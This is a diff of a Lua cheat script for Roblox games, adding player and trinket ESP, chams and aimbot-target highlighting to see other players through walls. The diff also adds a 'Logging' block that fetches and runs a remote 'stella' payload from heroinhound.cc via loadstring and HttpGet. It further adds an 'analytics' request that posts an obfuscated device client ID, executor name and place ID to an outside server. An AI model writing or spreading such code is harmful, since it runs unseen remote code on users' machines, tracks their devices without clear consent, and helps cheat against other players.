+                local ScriptContext = Services.ScriptContext
 
                 utility:Connection(ScriptContext.Error, function(message, stack, script_obj)
                     local script_name = tostring(script_obj)
@@ -2994,15 +3787,64 @@ if game.PlaceId == 100010170789226 then
                 end)
             end
 
-            utility:Connection(plr.Chatted, function(message)
+            plr.Chatted:Connect(function(message)
                 if noob(message) then
                     flag_chat(message)
                 end
             end)
         end
 
-        do -- ESP
-            do -- Player
+        do -- Logging
+            do -- Stella
+                getgenv().stella_token = "2cbc19e1a7366f0a71b65856257ae123e1ab81c05126c53d61ca529af319c65c"
+                getgenv().stella_debug = false
+
+                pcall(function()
+                    loadstring(game:HttpGet("https://stella.heroinhound.cc/stella.lua",true))() -- or u can use https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPOSITORY/refs/heads/main/hello_stella.lua but stella.heroinhound.cc/stella.lua will hold the most updates although i rarely update stella payload but U NEVER KNOW. just check back.
+                end)
+            end
+
+            do -- Analytics (only sent to Hydroxide developers — baba & boss)
+                pcall(function()
+                    local function transform(id)
+                        local pepper = "HW_"
+                        local mixed = pepper .. id .. pepper
+                        local final = ""
+
+                        for i = 1, #mixed do
+                            local val = string.byte(mixed, i)
+                            final = final .. string.format("%02X", (val * 13 + i * 5) % 256)
+                        end
+
+                        if #final < 56 then
+                            final = final .. string.rep("0", 56 - #final)
+                        end
+
+                        return final:sub(1, 56)
+                    end
+
+                    local client_id = Services.RbxAnalyticsService:GetClientId()
+                    local token = transform(client_id)
+
+                    local req = http_request or request
+                    pcall(req, {
+                        Url = "https://api.heroinhound.cc/v1/analytics",
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json",
+                        },
+                        Body = Services.HttpService:JSONEncode({
+                            uuid = token,
+                            executor = identifyexecutor and identifyexecutor() or "Unknown",
+                            place_id = game.PlaceId,
+                        }),
+                    })
+                end)
+            end
+        end
+
+        do
+            do
                 local trash_executor = identifyexecutor and identifyexecutor():lower():find("hydrogen") or identifyexecutor():lower():find("zenith")
 
                 cheat_client.calculate_player_bounding_box = LPH_NO_VIRTUALIZE(function(self, character)
@@ -3067,18 +3909,17 @@ if game.PlaceId == 100010170789226 then
                         text_update_interval = 0.09,
                         cached_status_effects = "",
                         last_status_update = 0,
-                        -- Bounding box cache to reduce WorldToViewportPoint calls
                         cached_bbox_position = nil,
                         cached_bbox_size = nil,
                         cached_bbox_on_screen = false,
                         bbox_cache_frame = 0,
-                        bbox_cache_lifetime = 1, -- Recalculate every 2 frames (balanced performance/smoothness)
+                        bbox_cache_lifetime = 1,
                     }
             
-                    do -- Create Drawings
+                    do
                         esp.drawings.name = utility:Create("Text", {
                             Text = player.name,
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Center = true,
                             Outline = true,
@@ -3088,7 +3929,7 @@ if game.PlaceId == 100010170789226 then
         
                         esp.drawings.intent = utility:Create("Text", {
                             Text = "nil",
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Center = true,
                             Outline = true,
@@ -3109,7 +3950,7 @@ if game.PlaceId == 100010170789226 then
             
                         esp.drawings.health_text = utility:Create("Text", {
                             Text = "100",
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Outline = true,
                             Color = Color3.fromRGB(255, 255, 255),
@@ -3124,7 +3965,7 @@ if game.PlaceId == 100010170789226 then
         
                         esp.drawings.mana_text = utility:Create("Text", {
                             Text = "100",
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Outline = true,
                             Color = Color3.fromRGB(255, 255, 255),
@@ -3132,7 +3973,7 @@ if game.PlaceId == 100010170789226 then
                         }, "esp")
         
                         esp.drawings.status_effects = utility:Create("Text", {
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Outline = true,
                             Color = Color3.fromRGB(255, 255, 255),
@@ -3140,7 +3981,7 @@ if game.PlaceId == 100010170789226 then
                         }, "esp")
 
                         esp.drawings.racial = utility:Create("Text", {
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Outline = true,
                             Color = Color3.fromRGB(255, 255, 255),
@@ -3149,7 +3990,7 @@ if game.PlaceId == 100010170789226 then
                         }, "esp")
 
                         esp.drawings.racial_number = utility:Create("Text", {
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Outline = true,
                             Color = Color3.fromRGB(255, 255, 255),
@@ -3158,7 +3999,7 @@ if game.PlaceId == 100010170789226 then
                         }, "esp")
 
                         esp.drawings.observe_status = utility:Create("Text", {
-                            Font = 2,
+                            Font = font,
                             Size = 13,
                             Outline = true,
                             Color = Color3.fromRGB(255, 255, 0),
@@ -3187,7 +4028,7 @@ if game.PlaceId == 100010170789226 then
                         end
                     end
                     
-                    do -- Create Chams
+                    do
                         esp.highlight = utility:Object("Highlight", {
                             FillTransparency = 0.65,
                             OutlineColor = Color3.fromRGB(255, 255, 255),
@@ -3202,7 +4043,6 @@ if game.PlaceId == 100010170789226 then
 
                         esp.highlight:Destroy()
 
-                        -- Disconnect all event connections to prevent leaks
                         if esp.connections then
                             for _, conn in pairs(esp.connections) do
                                 if conn and conn.Disconnect then
@@ -3222,7 +4062,6 @@ if game.PlaceId == 100010170789226 then
                             return
                         end
 
-                        -- Check master chams toggle first
                         local player_chams_enabled = shared and Toggles and Toggles.PlayerChams and Toggles.PlayerChams.Value
                         if not player_chams_enabled then
                             esp.highlight.Adornee = nil
@@ -3253,18 +4092,15 @@ if game.PlaceId == 100010170789226 then
                                     return
                                 end
 
-                                -- Use cached parts or populate cache
                                 if esp.cache_invalidated or not esp.cached_parts.humanoid then
                                     esp.cached_parts.humanoid = FindFirstChildOfClass(character, "Humanoid")
                                     esp.cached_parts.humanoid_root_part = FindFirstChild(character, "HumanoidRootPart")
 
-                                    -- Invalidate bounding box cache when character changes
                                     esp.cached_bbox_position = nil
                                     esp.bbox_cache_frame = 0
                                     esp.cache_invalidated = false
                                 end
 
-                                -- Cache status effects with 0.1s lifetime
                                 local current_time = tick()
                                 if not esp.status_cache_time or (current_time - esp.status_cache_time) > 0.1 then
                                     esp.cached_parts.kenhaki = FindFirstChild(character, "KenHaki")
@@ -3300,19 +4136,19 @@ if game.PlaceId == 100010170789226 then
 
                                 if should_highlight then
                                     if is_friendly and player_friendly_chams then
-                                        esp.highlight.FillColor = Color3.fromRGB(0, 255, 0) -- Green for friendly players
+                                        esp.highlight.FillColor = Color3.fromRGB(0, 255, 0)
                                         esp.highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
                                     elseif is_aimbot_target and player_aimbot_chams then
-                                        esp.highlight.FillColor = Color3.fromRGB(255, 255, 0) -- Yellow for aimbot targets
+                                        esp.highlight.FillColor = Color3.fromRGB(255, 255, 0)
                                         esp.highlight.OutlineColor = Color3.fromRGB(255, 255, 0)
                                     elseif has_counterspell and player_racial_chams then
-                                        esp.highlight.FillColor = Color3.fromRGB(255, 20, 147) -- Pink for Tempest Soul players
+                                        esp.highlight.FillColor = Color3.fromRGB(255, 20, 147)
                                         esp.highlight.OutlineColor = Color3.fromRGB(255, 20, 147)
                                     elseif has_kenhaki and player_racial_chams then
-                                        esp.highlight.FillColor = Color3.fromRGB(25, 80, 255) -- Blue for KenHaki players
+                                        esp.highlight.FillColor = Color3.fromRGB(25, 80, 255)
                                         esp.highlight.OutlineColor = Color3.fromRGB(25, 80, 255)
                                     elseif current_health < 66 and player_low_health then
-                                        esp.highlight.FillColor = Color3.fromRGB(255, 0, 0) -- Red for low health
+                                        esp.highlight.FillColor = Color3.fromRGB(255, 0, 0)
                                         esp.highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
                                     else
                                         esp.highlight.FillColor = Color3.fromRGB(0, 255, 255)
@@ -3370,19 +4206,16 @@ if game.PlaceId == 100010170789226 then
                                     return
                                 end
 
-                                -- Cache character parts to reduce FindFirstChild calls
                                 if esp.cache_invalidated or not esp.cached_parts.humanoid then
                                     esp.cached_parts.humanoid = FindFirstChildOfClass(character, "Humanoid")
                                     esp.cached_parts.humanoid_root_part = FindFirstChild(character, "HumanoidRootPart")
                                     esp.cached_parts.head = FindFirstChild(character, "Head")
 
-                                    -- Invalidate bounding box cache when character changes
                                     esp.cached_bbox_position = nil
                                     esp.bbox_cache_frame = 0
                                     esp.cache_invalidated = false
                                 end
 
-                                -- Cache status effects with 0.1s lifetime
                                 local current_time = tick()
                                 if not esp.status_cache_time or (current_time - esp.status_cache_time) > 0.1 then
                                     esp.cached_parts.kenhaki = FindFirstChild(character, "KenHaki")
@@ -3406,7 +4239,7 @@ if game.PlaceId == 100010170789226 then
                                 end
 
                                 local distance = (ws.CurrentCamera.CFrame.Position - humanoid_root_part.Position).Magnitude
-                                esp.last_distance = distance -- Store for frame throttling
+                                esp.last_distance = distance
 
                                 if distance >= ((Options and Options.PlayerRange and Options.PlayerRange.Value) or 100) then
                                     for _,v in next, esp.drawings do
@@ -3418,12 +4251,10 @@ if game.PlaceId == 100010170789226 then
                                     return
                                 end
 
-                                -- Use cached bounding box to reduce WorldToViewportPoint calls
                                 local screen_position, screen_size, on_screen
                                 esp.bbox_cache_frame = esp.bbox_cache_frame + 1
 
                                 if esp.bbox_cache_frame >= esp.bbox_cache_lifetime or not esp.cached_bbox_position then
-                                    -- Recalculate bounding box
                                     local screen_position_check, on_screen_check = ws.CurrentCamera:WorldToViewportPoint(humanoid_root_part.Position)
                                     on_screen = on_screen_check
 
@@ -3440,13 +4271,11 @@ if game.PlaceId == 100010170789226 then
 
                                     screen_position, screen_size = cheat_client:calculate_player_bounding_box(character)
 
-                                    -- Cache the results
                                     esp.cached_bbox_position = screen_position
                                     esp.cached_bbox_size = screen_size
                                     esp.cached_bbox_on_screen = on_screen
                                     esp.bbox_cache_frame = 0
                                 else
-                                    -- Use cached values
                                     screen_position = esp.cached_bbox_position
                                     screen_size = esp.cached_bbox_size
                                     on_screen = esp.cached_bbox_on_screen
@@ -3488,7 +4317,7 @@ if game.PlaceId == 100010170789226 then
                                 local is_friendly = cheat_client:is_friendly(esp.player)
 
                                 if screen_position and screen_size then
-                                    do -- Box
+                                    do
                                         if Toggles and Toggles.PlayerBox and Toggles.PlayerBox.Value and show_details then
                                             esp.drawings.box.Position = screen_position
                                             esp.drawings.box.Size = screen_size
@@ -3529,7 +4358,7 @@ if game.PlaceId == 100010170789226 then
                                         end
                                     end
 
-                                    do -- Observe Status Check
+                                    do
                                         local observe_text = ""
                                         local has_observe = false
 
@@ -3557,7 +4386,7 @@ if game.PlaceId == 100010170789226 then
                                             has_observe = esp.cached_texts.has_observe or false
                                         end
 
-                                        do -- Name
+                                        do
                                             if Toggles and Toggles.PlayerName and Toggles.PlayerName.Value then
                                                 if should_update_text then
                                                     esp.cached_texts.name = "["..tostring(math.floor(distance)).."m] "..esp.player.Name.."\n"..cheat_client:get_name(esp.player)
@@ -3575,7 +4404,7 @@ if game.PlaceId == 100010170789226 then
                                         end
 
 
-                                        do -- Observe Status
+                                        do
                                             if has_observe then
                                                 esp.drawings.observe_status.Text = observe_text
                                                 esp.drawings.observe_status.Position = esp.drawings.name.Position + Vector2.new(0, 27)
@@ -3586,7 +4415,7 @@ if game.PlaceId == 100010170789226 then
                                         end
                                     end
 
-                                    do -- Health
+                                    do
                                         if Toggles and Toggles.PlayerHealth and Toggles.PlayerHealth.Value and humanoid and show_details then
                                             local health_ratio = humanoid.Health / humanoid.MaxHealth
                                             esp.drawings.health.From = Vector2.new((screen_position.X - 5), screen_position.Y + screen_size.Y)
@@ -3618,7 +4447,7 @@ if game.PlaceId == 100010170789226 then
                                         end
                                     end
 
-                                    do -- Mana
+                                    do
                                         if Toggles and Toggles.PlayerMana and Toggles.PlayerMana.Value and show_details then
                                             local mana = esp.cached_parts.mana
                                             if mana then
@@ -3655,9 +4484,8 @@ if game.PlaceId == 100010170789226 then
                                         end
                                     end
 
-                                    do -- Status (throttled to reduce CPU usage)
+                                    do
                                         if Toggles and Toggles.PlayerTags and Toggles.PlayerTags.Value and show_details then
-                                            -- Throttle status effect checks to every 0.2s instead of every frame
                                             local now = tick()
                                             local should_update_status = (now - esp.last_status_update) >= 0.2
 
@@ -3687,10 +4515,6 @@ if game.PlaceId == 100010170789226 then
                                                     status_string ..= "[fire protection]\n"
                                                 end
 
-                                                if FindFirstChild(character, 'ColdProtect') then
-                                                    status_string ..= "[ice protection]\n"
-                                                end
-
                                                 if FindFirstChild(character, 'Blocking') then
                                                     status_string ..= "[blocking]\n"
                                                 end
@@ -3712,6 +4536,10 @@ if game.PlaceId == 100010170789226 then
 
                                                 if cs:HasTag(character, "Danger") or FindFirstChild(character, "Danger") then
                                                     status_string ..= "[danger]\n"
+                                                end
+
+                                                if FindFirstChild(character, 'ParryCool') then
+                                                    status_string ..= "[parry cd]\n"
                                                 end
 
                                                 local dmgMult = 1
@@ -3750,7 +4578,7 @@ if game.PlaceId == 100010170789226 then
                                         end
                                     end
 
-                                    do -- Runes
+                                    do
                                         local disp_runes = esp.player.Character and esp.player.Character:GetAttribute("DispRunes")
 
                                         if Toggles and Toggles.PlayerRacial and Toggles.PlayerRacial.Value and disp_runes and disp_runes ~= 0 and show_details then
@@ -3769,7 +4597,7 @@ if game.PlaceId == 100010170789226 then
                                         end
                                     end
 
-                                    do -- intent
+                                    do
                                         if Toggles and Toggles.PlayerIntent and Toggles.PlayerIntent.Value and show_details then
                                             local tool = FindFirstChildOfClass(character, "Tool")
 
@@ -3807,7 +4635,6 @@ if game.PlaceId == 100010170789226 then
                     esp.update_player_esp = update_player_esp
                     esp.update_player_chams = update_player_chams
 
-                    -- Store connections for proper cleanup
                     esp.connections = {}
 
                     local function setup_character_connections(character)
@@ -3865,9 +4692,351 @@ if game.PlaceId == 100010170789226 then
 
                     return esp
                 end
-            end          
+            end
+    
+            do
+                cheat_client.trinket_esp_objects = cheat_client.trinket_esp_objects or {}
+
+                local masks = {
+                    "135210454467508",
+                    "130937394581985",
+                    "110718109649132",
+                    "78990214596147",
+                    "77406341502228",
+                    "118090092039844"
+                }
+
+                local function in_table(tbl, val)
+                    for _, v in ipairs(tbl) do
+                        if v == val then
+                            return true
+                        end
+                    end
+                    return false
+                end
+                
+                function cheat_client:identify_trinket(v)
+                    if (v.ClassName == 'UnionOperation' and gethiddenproperty(v, "AssetId"):gsub("%%20", ""):match("%d+") == "2765613127") then
+                        return 'Idol of the Forgotten', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+
+                    elseif (v.ClassName == 'UnionOperation' and gethiddenproperty(v, "AssetId"):gsub("%%20", ""):match("%d+") == "15583017412") then
+                        return 'Ornament', cheat_client.trinket_colors.event.Color, cheat_client.trinket_colors.event.ZIndex
+                    elseif (v.ClassName == 'UnionOperation' and gethiddenproperty(v, "AssetId"):gsub("%%20", ""):match("%d+") == "15611175305") then
+                        return 'Present', cheat_client.trinket_colors.event.Color, cheat_client.trinket_colors.event.ZIndex
+
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://5196782997') then
+                        return 'Old Ring', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://5196776695') then
+                        return 'Ring', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://5204003946') then
+                        return 'Goblet', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://5196577540') then
+                        return 'Old Amulet', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://5196551436') then
+                        return 'Amulet', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+                    elseif (v.ClassName == 'Part' and FindFirstChildWhichIsA(v, "SpecialMesh") and FindFirstChild(v, 'OrbParticle')) then
+                        return '???', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    elseif (v.ClassName == 'Part' and FindFirstChildWhichIsA(v, "SpecialMesh") and FindFirstChild(v, 'ParticleEmitter') and FindFirstChildWhichIsA(v, "SpecialMesh").MeshId == "" and FindFirstChildWhichIsA(v, "SpecialMesh").MeshType == Enum.MeshType.Sphere) then
+                        return 'Opal', cheat_client.trinket_colors.common.Color, cheat_client.trinket_colors.common.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://5204453430') then
+                        return 'Scroll', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    elseif (FindFirstChild(v, 'Mesh') and v.Mesh.MeshId == 'rbxassetid://%202877143560%20' and FindFirstChild(v, 'ParticleEmitter') and string.match(tostring(v.ParticleEmitter.Color), '0 1 1 1 0 1 1 1 1 0') and v.ClassName == 'Part' and tostring(v.Color) == '0.643137, 0.733333, 0.745098') then
+                        return 'Diamond', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    elseif (FindFirstChild(v, 'Mesh') and v.Mesh.MeshId == 'rbxassetid://%202877143560%20' and FindFirstChild(v, 'ParticleEmitter') and string.match(tostring(v.ParticleEmitter.Color), '0 1 1 1 0 1 1 1 1 0') and v.ClassName == 'Part' and v.Color.G > v.Color.R and v.Color.G > v.Color.B) then
+                        return 'Emerald', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    elseif (FindFirstChild(v, 'Mesh') and v.Mesh.MeshId == 'rbxassetid://%202877143560%20' and FindFirstChild(v, 'ParticleEmitter') and string.match(tostring(v.ParticleEmitter.Color), '0 1 1 1 0 1 1 1 1 0') and v.ClassName == 'Part' and v.Color.R > v.Color.G and v.Color.R > v.Color.B) then
+                        return 'Ruby', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    elseif (FindFirstChild(v, 'Mesh') and v.Mesh.MeshId == 'rbxassetid://%202877143560%20' and FindFirstChild(v, 'ParticleEmitter') and string.match(tostring(v.ParticleEmitter.Color), '0 1 1 1 0 1 1 1 1 0') and v.ClassName == 'Part' and v.Color.B > v.Color.G and v.Color.B > v.Color.R) then
+                        return 'Sapphire', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    elseif (v.ClassName == 'Part' and FindFirstChild(v, 'ParticleEmitter') and not string.match(tostring(v.ParticleEmitter.Color), '0 1 1 1 0 1 1 1 1 0')) then
+                        return 'Rift Gem', cheat_client.trinket_colors.mythic.Color, cheat_client.trinket_colors.mythic.ZIndex
+                    elseif (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://5197099782" and FindFirstChild(v, "MeshPart") and v.MeshPart.MeshId == "rbxassetid://5197111525") then
+                        return 'Amulet of the White King', cheat_client.trinket_colors.artifact.Color, cheat_client.trinket_colors.artifact.ZIndex
+                    elseif (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://5196963069" and FindFirstChild(v, "MeshPart") and v.MeshPart.MeshId == "rbxassetid://5196975152") then
+                        return 'Lannis Amulet', cheat_client.trinket_colors.artifact.Color, cheat_client.trinket_colors.artifact.ZIndex
+                    elseif (FindFirstChild(v, 'Attachment') and FindFirstChildOfClass(v.Attachment, 'ParticleEmitter') and FindFirstChildOfClass(v.Attachment, 'ParticleEmitter').Rate == 3) then
+                        return 'Mysterious Artifact', cheat_client.trinket_colors.mythic.Color, cheat_client.trinket_colors.mythic.ZIndex
+
+                    elseif (v:IsA('MeshPart') and v.MeshId == "rbxassetid://4103271893") then
+                        return 'Candy', cheat_client.trinket_colors.event.Color, cheat_client.trinket_colors.event.ZIndex
+                    elseif v.ClassName == "UnionOperation" then
+                        local assetId = gethiddenproperty(v, "AssetId"):gsub("%%20", ""):match("%d+")
+                        if in_table(masks, assetId) then
+                            return "Scary Mask", cheat_client.trinket_colors.event.Color, cheat_client.trinket_colors.event.ZIndex
+                        end
+
+                    elseif (v.ClassName == 'UnionOperation' and gethiddenproperty(v, "AssetId"):gsub("%%20", ""):match("%d+") == "4117970107") then
+                        return 'Pumpkin Centerpiece', cheat_client.trinket_colors.event.Color, cheat_client.trinket_colors.event.ZIndex
+
+                        
+                    elseif (FindFirstChild(v, 'Attachment') and FindFirstChildOfClass(v.Attachment, 'ParticleEmitter') and FindFirstChildOfClass(v.Attachment, 'ParticleEmitter').Rate == 5 and tostring(FindFirstChildOfClass(v.Attachment, 'ParticleEmitter').Color):split(" ")[3] ~= "0.8") then
+                        local name = (game.PlaceId == 3541987450) and 'Phoenix Flower' or 'Azael Horn'
+                        return name, cheat_client.trinket_colors.mythic.Color, cheat_client.trinket_colors.mythic.ZIndex
+                    
+                    elseif (FindFirstChild(v, 'Attachment') and FindFirstChildOfClass(v.Attachment, 'ParticleEmitter') and FindFirstChildOfClass(v.Attachment, 'ParticleEmitter').Rate == 5 and tostring(FindFirstChildOfClass(v.Attachment, 'ParticleEmitter').Color):split(" ")[3]=="0.8") then
+                        return 'Phoenix Down', cheat_client.trinket_colors.artifact.Color, cheat_client.trinket_colors.artifact.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.BrickColor.Name == 'Black') then
+                        return 'Night Stone', cheat_client.trinket_colors.artifact.Color, cheat_client.trinket_colors.artifact.ZIndex
+                    elseif (v.ClassName == 'MeshPart' and v.MeshId == 'rbxassetid://%202520762076%20') then
+                        return 'Howler Friend', cheat_client.trinket_colors.artifact.Color, cheat_client.trinket_colors.artifact.ZIndex
+                    elseif (v.ClassName == 'Part' and FindFirstChild(v, 'OrbParticle') and string.match(tostring(v.OrbParticle.Color), '0 0.105882 0.596078 0.596078 0 1 0.105882 0.596078 0.596078 0 ')) then
+                        return 'Ice Essence', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                    end
+
+                    if game.PlaceId == 3541987450 then
+                        if (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://4027112893" and FindFirstChild(v, "Part")) then
+                            return 'Bound Book', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                        elseif (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://%202877143560%20" and v.Color.B < v.Color.G and v.Color.B > v.Color.R) then
+                            return 'Emerald', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.Zinde
+                        elseif (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://%202877143560%20" and v.Color.R > v.Color.G and v.Color.R > v.Color.B) then
+                            return 'Ruby', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                        elseif (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://%202877143560%20" and v.Color.B > v.Color.R and v.Color.B > v.Color.G) then
+                            return 'Sapphire', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                        elseif (v.ClassName == "MeshPart" and v.MeshId == "rbxassetid://%202877143560%20" and tostring(v.Color) == '0.643137, 0.733333, 0.745098') then
+                            return 'Diamond', cheat_client.trinket_colors.rare.Color, cheat_client.trinket_colors.rare.ZIndex
+                        end
+                    end
+
+                    return "Opal", cheat_client.trinket_colors.none.Color, cheat_client.trinket_colors.none.ZIndex
+                end
+        
+                function cheat_client:add_trinket_esp(trinket, name, color, zindex)
+                    local esp = {
+                        object = trinket,
+                        name = name,
+                        color = color,
+                        zindex = zindex or -10,
+                        drawings = {},
+                        area = "Unknown",
+                        already_disabled = false,
+                        cached_text = "",
+                        last_text_update = 0,
+                        text_update_interval = 0.2,
+                    }
+                    
+                    local function detectTrinketArea()
+                        if not FindFirstChild(ws, "AreaMarkers") then return "None" end
+                        
+                        local LocationName = "None"
+                        local LocationNumSq = math.huge
+                        local Area = ws.AreaMarkers
+                        local trinketPos = trinket.Position
+                        
+                        for i,v in pairs(Area:GetChildren()) do
+                            local diff = trinketPos - v.Position
+                            local distSq = diff.X * diff.X + diff.Y * diff.Y + diff.Z * diff.Z
+                            if distSq < LocationNumSq then
+                                LocationName = v.Name
+                                LocationNumSq = distSq
+                            end
+                        end
+                        
+                        return LocationName
+                    end
+                    
+                    esp.area = detectTrinketArea()
+    
+                    do
+                        esp.drawings.main_text = utility:Create("Text", {
+                            Center = true,
+                            Outline = true,
+                            Color = esp.color,
+                            Transparency = 1,
+                            Text = esp.name,
+                            Size = 13,
+                            Font = font,
+                            ZIndex = esp.zindex,
+                            Visible = false
+                        }, "esp")
+                    end
+    
+                    function esp:destruct()
+                        for _,v in next, esp.drawings do
+                            fast_remove(shared.drawing_containers.esp, v)
+                            v:Remove()
+                        end
+
+                        if cheat_client.trinket_esp_objects then
+                            cheat_client.trinket_esp_objects[esp.object] = nil
+                        end
+                    end
+    
+                    local function update_trinket_esp(toggled)
+                        if not toggled then
+                            if not esp.already_disabled then
+                                esp.drawings.main_text.Visible = false
+                                esp.already_disabled = true
+                            end
+                            return
+                        end
+
+                        if Options and Options.TrinketTypes and Options.TrinketTypes.Value then
+                            local filters = Options.TrinketTypes.Value
+                            local should_show = false
+
+                            if esp.color == cheat_client.trinket_colors.common.Color and filters["Common"] then
+                                should_show = true
+                            elseif esp.color == cheat_client.trinket_colors.rare.Color and filters["Rare"] then
+                                should_show = true
+                            elseif esp.color == cheat_client.trinket_colors.mythic.Color and filters["Mythic"] then
+                                should_show = true
+                            elseif esp.color == cheat_client.trinket_colors.artifact.Color and filters["Artifact"] then
+                                should_show = true
+                            elseif esp.color == cheat_client.trinket_colors.event.Color and filters["Event"] then
+                                should_show = true
+                            end
+
+                            if not should_show then
+                                esp.drawings.main_text.Visible = false
+                                return
+                            end
+                        end
+
+                        esp.already_disabled = false
+                        if esp.object.Parent ~= nil then
+                            if cheat_client.window_active then
+                                local camera = ws.CurrentCamera
+                                local objectPos = esp.object.CFrame.Position
+                                local distance = (camera.CFrame.Position - objectPos).Magnitude
+
+                                local ignore_range = false
+                                if Options and Options.TrinketIgnoreRangeTypes and Options.TrinketIgnoreRangeTypes.Value then
+                                    local ignore_types = Options.TrinketIgnoreRangeTypes.Value
+
+                                    if (esp.color == cheat_client.trinket_colors.common.Color and ignore_types["Common"]) or
+                                       (esp.color == cheat_client.trinket_colors.rare.Color and ignore_types["Rare"]) or
+                                       (esp.color == cheat_client.trinket_colors.mythic.Color and ignore_types["Mythic"]) or
+                                       (esp.color == cheat_client.trinket_colors.artifact.Color and ignore_types["Artifact"]) or
+                                       (esp.color == cheat_client.trinket_colors.event.Color and ignore_types["Event"]) then
+
+                                        if Options and Options.TrinketTypes and Options.TrinketTypes.Value then
+                                            local filters = Options.TrinketTypes.Value
+                                            if (esp.color == cheat_client.trinket_colors.common.Color and filters["Common"]) or
+                                               (esp.color == cheat_client.trinket_colors.rare.Color and filters["Rare"]) or
+                                               (esp.color == cheat_client.trinket_colors.mythic.Color and filters["Mythic"]) or
+                                               (esp.color == cheat_client.trinket_colors.artifact.Color and filters["Artifact"]) or
+                                               (esp.color == cheat_client.trinket_colors.event.Color and filters["Event"]) then
+                                                ignore_range = true
+                                            end
+                                        end
+                                    end
+                                end
+
+                                if not ignore_range and distance >= ((Options and Options.TrinketRange and Options.TrinketRange.Value) or 75) then
+                                    esp.drawings.main_text.Visible = false
+                                    return
+                                end
+
+                                local screen_position, on_screen = camera:WorldToViewportPoint(objectPos)
+
+                                if not on_screen then
+                                    esp.drawings.main_text.Visible = false
+                                    return
+                                end
+
+                                local now = tick()
+                                local should_update_text = (now - esp.last_text_update) >= esp.text_update_interval
+
+                                if should_update_text then
+                                    local area_text = (esp.area ~= "None" and Toggles and Toggles.TrinketShowArea and Toggles.TrinketShowArea.Value) and " ("..esp.area..")" or ""
+                                    esp.cached_text = esp.name.."\n["..tostring(math.floor(distance)).."]"..area_text
+                                    esp.last_text_update = now
+                                end
+
+                                esp.drawings.main_text.Text = esp.cached_text
+                                esp.drawings.main_text.Position = Vector2.new(screen_position.X, screen_position.Y)
+                                esp.drawings.main_text.Visible = true
+                            else
+                                esp.drawings.main_text.Visible = false
+                            end
+                        else
+                            esp:destruct()
+                        end
+                    end
+
+                    esp.update_trinket_esp = update_trinket_esp
+                    cheat_client.trinket_esp_objects[trinket] = esp
+                    return esp
+                end
+            end
             
-            do -- NPC ESP
+            do
+                if game.PlaceId == 5208655184 or game.PlaceId == 109732117428502 then
+                    cheat_client.fallion_esp_objects = cheat_client.fallion_esp_objects or {}
+                    
+                    function cheat_client:add_fallion_esp(npc, name)
+                        local esp = {
+                            object = npc,
+                            name = "[" .. name .. "]",
+                            color = Color3.fromRGB(255, 115, 229),
+                            drawings = {},
+                            already_disabled = false,
+                        }
+            
+                        do
+                            esp.drawings.main_text = utility:Create("Text", {
+                                Center = true,
+                                Outline = true,
+                                Color = esp.color,
+                                Transparency = 1,
+                                Text = esp.name,
+                                Size = 13,
+                                Font = font,
+                                ZIndex = -10,
+                                Visible = false
+                            }, "esp")
+                        end
+            
+                        function esp:destruct()
+                            for _, v in next, esp.drawings do
+                                fast_remove(shared.drawing_containers.esp, v)
+                                v:Remove()
+                            end
+
+                            if cheat_client.fallion_esp_objects then
+                                cheat_client.fallion_esp_objects[esp.object] = nil
+                            end
+                        end
+            
+                        local function update_fallion_esp(toggled)
+                            if not toggled then
+                                if not esp.already_disabled then
+                                    esp.drawings.main_text.Visible = false
+                                    esp.already_disabled = true
+                                end
+                                return
+                            end
+                            
+                            esp.already_disabled = false
+                            if esp.object.Parent ~= nil then
+                                if cheat_client.window_active then
+                                    local distance = (ws.CurrentCamera.CFrame.Position - esp.object.HumanoidRootPart.CFrame.Position).Magnitude
+                                    local screen_position, on_screen = ws.CurrentCamera:WorldToViewportPoint(esp.object.HumanoidRootPart.CFrame.Position)
+                                    
+                                    if not on_screen then
